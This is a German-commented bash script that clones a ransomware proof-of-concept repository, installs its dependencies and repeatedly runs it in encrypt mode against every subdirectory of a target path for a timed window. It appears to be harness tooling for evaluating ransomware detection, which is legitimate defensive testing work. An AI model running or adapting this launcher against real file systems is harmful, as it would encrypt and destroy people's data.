#!/bin/bash

# --- KONFIGURATION ---
PROJECT_NAME="JimmyRansomware"
INSTALL_DIR="$(pwd)/$PROJECT_NAME"
VENV_DIR="$INSTALL_DIR/venv"
REPO_URL="https://github.com/jimmy-ly00/Ransomware-PoC"
REAL_USER=${SUDO_USER:-$USER}

# -----------------------------------------------------------------
# DER TERMINATOR (Cleanup) 
# -----------------------------------------------------------------
cleanup() {
    trap - SIGINT SIGTERM EXIT
    echo -e "\n\033[0;31m🚨 NOT-AUS: Stoppe alle Prozesse...\033[0m"
    # Stoppe alle Python main.py Prozesse (auch die von root)
    pkill -9 -f "main.py.*-p.*-e" 2>/dev/null
    # Stoppe alle Jobs dieses Skripts
    jobs -p | xargs -r kill -9 2>/dev/null
    pkill -9 -P $$ 2>/dev/null
    exit 130
}
trap cleanup SIGINT SIGTERM EXIT

# -----------------------------------------------------------------
# 1. SETUP-FUNKTION (Wieder eingebaut!)
# -----------------------------------------------------------------
do_setup() {
    echo -e "\033[0;32m[+] Starte Setup im Projektordner...\033[0m"
    sudo apt-get update -q && sudo apt-get install -y python3-venv git python3-pip -q

    if [ -d "$INSTALL_DIR" ]; then
        sudo chown -R "$REAL_USER:$REAL_USER" "$INSTALL_DIR"
    fi

    sudo -u "$REAL_USER" bash -c "
        if [ ! -d '$INSTALL_DIR' ]; then
            git clone '$REPO_URL' '$INSTALL_DIR' --quiet
        fi
        cd '$INSTALL_DIR'
        if [ ! -d 'venv' ]; then
            echo '[+] Erstelle venv...'
            python3 -m venv venv
        fi
        ./venv/bin/pip install --upgrade pip --quiet
        ./venv/bin/pip install pycryptodome --quiet
    "
    echo -e "\033[0;32m[OK] Setup fertig. Die venv liegt in $VENV_DIR\033[0m"
}

# -----------------------------------------------------------------
# 2. RUN-FUNKTION (Mit automatischem Setup)
# -----------------------------------------------------------------
do_run() {
    TARGET=$1
    DURATION=$2

    if [[ -z "$TARGET" || -z "$DURATION" ]]; then
        echo "Benutzung: ./run_jimmy_ransomware.sh run [Pfad] [Sekunden]"; exit 1
    fi

    # Automatisches Setup, falls venv nicht existiert
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "\033[0;33m[INFO] venv nicht gefunden. Führe automatisch Setup aus...\033[0m"
        do_setup
        echo -e "\033[0;32m[INFO] Setup abgeschlossen. Starte Ransomware...\033[0m"
    fi

    mapfile -t SUBDIRS < <(find "$TARGET" -type d 2>/dev/null)
    
    echo -e "\033[0;32m=== DETECTIVE MODE GESTARTET (Dauer: ${DURATION}s) ===\033[0m"
    echo -e "\033[0;33m[DEBUG] Gefundene Verzeichnisse: ${#SUBDIRS[@]}\033[0m"
    echo -e "\033[0;33m[DEBUG] Dateien: $(find "$TARGET" -type f 2>/dev/null | wc -l)\033[0m"
    
    if [ ${#SUBDIRS[@]} -eq 0 ] || [ ${#SUBDIRS[@]} -eq 1 ]; then
        echo -e "\033[0;31m[WARNUNG] Nur 1 Verzeichnis gefunden. Berechtigungsproblem bei find?\033[0m"
        echo -e "\033[0;33m[INFO] Verwende Hauptverzeichnis direkt...\033[0m"
        SUBDIRS=("$TARGET")
    fi

    END_TIME=$((SECONDS + DURATION))

    # Starte Verschlüsselung asynchron im Hintergrund
    ATTACK_COUNT=0
    while [ $SECONDS -lt $END_TIME ]; do
        for SUBDIR in "${SUBDIRS[@]}"; do
            if [ $SECONDS -ge $END_TIME ]; then break 2; fi

            ATTACK_COUNT=$((ATTACK_COUNT + 1))
            echo -e "\033[0;34m[ANGRIFF #$ATTACK_COUNT]\033[0m $SUBDIR"
            
            # Starte Python im Hintergrund als root (volle Berechtigungen für NFS)
            "$VENV_DIR/bin/python3" "$INSTALL_DIR/main.py" -p "$SUBDIR" -e &>/dev/null &
            LAST_PID=$!
            
            # Debug: Prüfe ob Prozess läuft
            sleep 0.1
            if ps -p $LAST_PID > /dev/null 2>&1; then
                echo -e "  \033[0;32m✓ Prozess $LAST_PID läuft\033[0m"
            else
                echo -e "  \033[0;31m✗ Prozess $LAST_PID beendet (Fehler?)\033[0m"
            fi
            
            # Kurze Pause zwischen Angriffen
            sleep 0.3
        done
        sleep 0.5
    done
    
    echo -e "\n\033[0;33m[INFO] Warte auf Ende ($END_TIME - $SECONDS = $((END_TIME - SECONDS))s)...\033[0m"
    
    # Warte bis zur END_TIME
    sleep $((END_TIME - SECONDS))
}

# -----------------------------------------------------------------
# AUSWAHLMENÜ
# -----------------------------------------------------------------
# Wenn nur 2 Parameter (ohne Kommando), dann automatisch "run" annehmen
if [[ $# -eq 2 && "$1" != "setup" && "$1" != "reset" ]]; then
    # Automatischer Run-Modus für Evaluation-Script Kompatibilität
    do_run "$1" "$2"
    exit $?
fi

case "$1" in
    setup) do_setup ;;
    run)   do_run "$2" "$3" ;;
    reset) find "$2" -name "*.wasted" -type f -delete 2>/dev/null ;;
    *)     echo "Befehle: setup | run <pfad> <sekunden> | reset <pfad>"
           echo "Oder direkt: $0 <pfad> <sekunden> (automatischer Run-Modus)" ;;
esac